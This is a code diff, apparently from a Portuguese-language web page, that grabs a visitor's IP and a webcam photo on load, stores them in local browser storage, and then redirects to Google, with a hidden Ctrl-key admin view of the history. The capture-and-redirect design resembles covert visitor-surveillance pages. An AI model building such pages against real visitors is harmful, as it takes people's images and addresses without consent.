@@ -18,6 +18,7 @@
         #photo-display { margin-top: 40px; text-align: center; }
         #photo-display img { max-width: 100%; border: 3px solid #ccc; display: none; }
         #status-message { color: yellow; font-weight: bold; margin-bottom: 10px; }
+        #redirect-status { display:none; }
         #redirect-timer { font-size: 1.2em; color: orange; }
     </style>
 </head>
@@ -27,7 +28,7 @@
         <div id="capture-view">
             <h1>📸 Capturando Imagem...</h1>
             <p id="status-message">Aguardando... Pressione **Ctrl** para acesso rápido.</p> 
-            <p id="redirect-status" style="display:none;">Você será redirecionado em <span id="redirect-timer">5</span> segundos.</p>
+            <p id="redirect-status">Você será redirecionado em <span id="redirect-timer">5</span> segundos.</p>
         </div>
 
         <div id="admin-view">
@@ -63,7 +64,8 @@
         const REDIRECT_URL = 'https://www.google.com';
         const STORAGE_KEY = 'photoHistory';
         const REDIRECT_TIME_SECONDS = 5;
-        
+        const DATA_PREFIX = 'data:image/png;base64,'; // Prefixo completo para exibição
+
         const video = document.getElementById('webcam-video');
         const canvas = document.getElementById('canvas');
         const context = canvas.getContext('2d');
@@ -79,7 +81,7 @@
         let photoData = null;
         let userIP = 'IP_NAO_ENCONTRADO';
         let webcamStream = null;
-        let redirectCountdownId = null; // Renomeado para clareza
+        let redirectCountdownId = null;
         let historyData = [];
         let isInAdminMode = false;
 
@@ -98,10 +100,14 @@
             localStorage.setItem(STORAGE_KEY, JSON.stringify(historyData));
         }
 
+        // 🟢 REFORÇO CRÍTICO: Garantir que a imagem seja um Data URI completo
         function displayPhoto(base64Img) {
-            if (!base64Img.startsWith('data:')) {
-                base64Img = 'data:image/png;base64,' + base64Img;
+             // Se o prefixo estiver faltando, a imagem salva está apenas como Base64 cru.
+             // Adicionamos o prefixo DATA_PREFIX na frente.
+            if (base64Img && !base64Img.startsWith(DATA_PREFIX)) {
+                base64Img = DATA_PREFIX + base64Img;
             }
+            
             selectedPhoto.src = base64Img;
             selectedPhoto.style.display = 'block';
         }
@@ -129,7 +135,7 @@
         }
         
         function enterAdminMode() {
-            if (isInAdminMode) return; // Evita múltiplas entradas
+            if (isInAdminMode) return;
 
             isInAdminMode = true; 
 
@@ -169,10 +175,12 @@
                 });
         }
         
+        // 🟢 REFORÇO CRÍTICO: Salvando APENAS o dado Base64 (sem o prefixo) para manter a consistência com a função displayPhoto
         function takePhoto() {
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            // Salva apenas o Base64 sem o cabeçalho 'data:image/png;base64,'
             photoData = canvas.toDataURL('image/png').split(',')[1]; 
         }
 
@@ -180,7 +188,7 @@
             if (photoData) {
                 const newItem = {
                     ip: userIP,
-                    img: photoData,
+                    img: photoData, // img é APENAS a string Base64
                     timestamp: new Date().toISOString()
                 };
                 
@@ -189,7 +197,6 @@
                 saveHistory(); 
             }
             
-            // Atualiza a visualização para o timer
             statusMessage.style.display = 'none';
             redirectStatus.style.display = 'block';
 
@@ -197,7 +204,6 @@
             redirectTimerSpan.textContent = timeLeft;
 
             const countdown = setInterval(() => {
-                // Checa a flag dentro do loop (pressionamento de Ctrl durante o countdown)
                 if (isInAdminMode) {
                     clearInterval(countdown);
                     return;
@@ -219,7 +225,6 @@
         // INICIALIZAÇÃO E CONTROLE DE TECLAS
         // ==========================================================
         
-        // 1. Lógica de controle de teclas (CTRL)
         window.addEventListener('keydown', (e) => {
             if (e.key === 'Control') {
                 e.preventDefault(); 
@@ -227,26 +232,26 @@
             }
         });
 
-        // 2. Fluxo de inicialização principal
         async function runCaptureFlow() {
-            // 🛑 VERIFICAÇÃO CRÍTICA NO INÍCIO DO ONLOAD
-            // Se a tecla Ctrl estiver pressionada no momento em que a página termina de carregar, 
-            // entra no modo administrador IMEDIATAMENTE.
+            // 🛑 VERIFICAÇÃO CRÍTICA (Ctrl pressionado no load)
             if (window.event && window.event.ctrlKey) {
                 enterAdminMode();
                 return;
             }
+            
+            // Garante que a visualização do timer esteja oculta no início
+            redirectStatus.style.display = 'none'; 
+            statusMessage.style.display = 'block';
 
-            // Garante que a captura só ocorrerá se não estiver no modo admin (a flag é verificada novamente)
             if (isInAdminMode) return; 
 
-            statusMessage.textContent = "Iniciando captura...";
+            statusMessage.textContent = "Iniciando captura de IP e câmera...";
 
             await fetchUserIP();
             
             try {
                 await startWebcam();
-                statusMessage.textContent = "Foto capturada! Salvando...";
+                statusMessage.textContent = "Câmera ativa. Capturando foto e salvando...";
                 takePhoto();
                 saveAndRedirect();
                 
